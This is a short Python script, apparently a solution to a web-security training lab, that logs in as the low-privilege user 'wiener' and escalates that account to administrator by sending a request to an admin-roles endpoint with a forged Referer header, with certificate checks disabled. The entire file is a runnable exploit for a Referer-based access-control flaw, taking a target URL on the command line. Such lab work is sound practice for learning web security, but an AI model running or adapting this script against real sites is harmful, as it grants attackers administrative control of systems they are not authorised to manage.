# made by MuteAvery
# imports
import requests
import sys
import urllib3
# disabling warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def promote_to_admin(s, url):
    # Loging in as wiener
    login_url = url + '/login'
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False)
    res = r.text
    if 'Log out' in r.text:
        print("(+) Successfully logged in as wiener")
        # exploiting 
        admin_roles = url + "/admin-roles?username=wiener&action=upgrade"
        headers ={'Referer': url + '/admin'}
        r = s.get(admin_roles, headers=headers, verify=False)
        if r.status_code == 200:
            print("(+) Successfully upgraded wiener to Admin")
        else:
            print("(-) Failed to upgrade Wiener to Admin")
            print(f"reason:{r.status_code}")
    else:    
        print("Failed to login as Wiener")
# main func
def main(): 
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == '__main__':
    main()